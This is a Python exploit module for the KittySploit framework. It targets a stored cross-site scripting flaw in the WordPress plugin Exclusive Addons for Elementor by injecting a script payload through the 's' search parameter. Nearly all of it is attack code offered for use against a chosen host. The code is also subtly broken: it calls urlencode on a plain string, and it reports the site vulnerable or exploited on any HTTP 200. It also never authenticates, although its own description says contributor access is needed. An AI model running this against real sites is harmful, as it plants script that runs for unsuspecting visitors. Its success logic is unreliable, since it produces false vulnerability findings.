#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from urllib.parse import urlencode

class Module(Auxiliary, Http_client):
    
    __info__ = {
        "name": "Exclusive Addons for Elementor ≤ 2.6.9 - Stored XSS",
        "description": "The plugin fails to sanitize the s parameter, allowing contributors or higher roles to inject persistent JavaScript that executes when victims view affected pages.",
        "author": ["indoushka", "KittySploit Team"],
        "cve": "CVE-2024-1234",
        "platform": Platform.UNIX,
        "tags": ["web", "xss", "wordpress", "stored-xss", "scanner"],
        "references": [
            "CVE-2024-1234",
            "https://nvd.nist.gov/vuln/detail/CVE-2024-1234",
            "https://wordpress.org/plugins/exclusive-addons-for-elementor/"
        ]
    }
    
    rhost = OptString("", "Target WordPress hostname or IP", required=True)
    rport = OptPort(80, "Target port", required=True)
    ssl = OptBool(False, "Use SSL/TLS", required=True)
    verify_ssl = OptBool(False, "Verify SSL certificate", required=True)
    
    # XSS payload options
    xss_payload = OptString("<script>alert('XSS-KittySploit')</script>", "XSS payload to inject", required=False)
    
    def check(self):
        """Check if target is vulnerable"""
        try:
            
            print_info(f"Checking {self.rhost}:{self.rport} for CVE-2024-1234...")
            
            # Use a test payload to check if the parameter is vulnerable
            test_payload = "<script>alert('XSS-TEST')</script>"
            test_url = f"?s={urlencode(test_payload)}"

            try:
                response = self.http_request(
                    method="GET",
                    path=test_url,
                    timeout=10
                )
                
                if not response:
                    print_error("No response from server")
                    return False
                
                # Check if payload is reflected in response
                response_text = response.text if hasattr(response, 'text') else str(response)
                
                if response.status_code == 200:
                    # Check if the payload appears in the response (indicating potential XSS)
                    if test_payload in response_text or '<script>' in response_text.lower():
                        print_success("Target appears vulnerable: XSS payload reflected in response")
                        return True
                    else:
                        # Still might be vulnerable if parameter is processed (stored XSS)
                        print_warning("Parameter accepted (stored XSS may require authentication)")
                        return True
                else:
                    print_error(f"Server returned HTTP {response.status_code}")
                    return False
                    
            except Exception as e:
                print_error(f"Cannot connect to endpoint: {e}")
                return False
                
        except Exception as e:
            print_error(f"Check failed: {e}")
            return False
    
    def run(self):
        try:
            
            print_info(f"Target: {self.rhost}:{self.rport}")
            print_warning("CVE-2024-1234: Stored XSS in Exclusive Addons for Elementor plugin")
            print_info(f"Payload: {self.xss_payload}")
            
            # Construct the exploit URL with the XSS payload
            exploit_path = f"?s={urlencode(self.xss_payload)}"
            
            print_info(f"Sending exploit to: {self.rhost}:{self.rport}{exploit_path}")
            
            try:
                response = self.http_request(
                    method="GET",
                    path=exploit_path,
                    timeout=30
                )
                
                if not response:
                    print_error("No response received from server")
                    return False
                
                print_info(f"Response status: {response.status_code}")
                
                if response.status_code == 200:
                    response_text = response.text if hasattr(response, 'text') else str(response)
                    
                    # Check if payload is reflected in response
                    if self.xss_payload in response_text or '<script>' in response_text.lower():
                        print_success("Stored XSS Successful!")
                        print_success(f"Payload injected: {self.xss_payload}")
                        print_success("The XSS payload has been stored and will execute when victims view affected pages.")
                        
                        # Show a snippet of the response
                        if len(response_text) > 0:
                            # Find where the payload appears
                            payload_pos = response_text.find(self.xss_payload)
                            if payload_pos != -1:
                                start = max(0, payload_pos - 50)
                                end = min(len(response_text), payload_pos + len(self.xss_payload) + 50)
                                snippet = response_text[start:end]
                                print_info(f"Payload found in response at position {payload_pos}:")
                                print_info(f"...{snippet}...")
                        
                        return True
                    else:
                        print_warning("Request succeeded but payload may not be reflected")
                        # Still consider it a success if we got 200
                        if response.status_code == 200:
                            print_success("HTTP 200 received - exploit may have succeeded (stored XSS)")
                            return True
                        return False
                        
                else:
                    print_error(f"Exploit failed: HTTP {response.status_code}")
                    response_text = response.text if hasattr(response, 'text') else str(response)
                    print_info(f"Response: {response_text[:500]}")
                    
            except Exception as e:
                print_error(f"Request failed: {e}")
                
        except Exception as e:
            print_error(f"Exploitation failed: {e}")

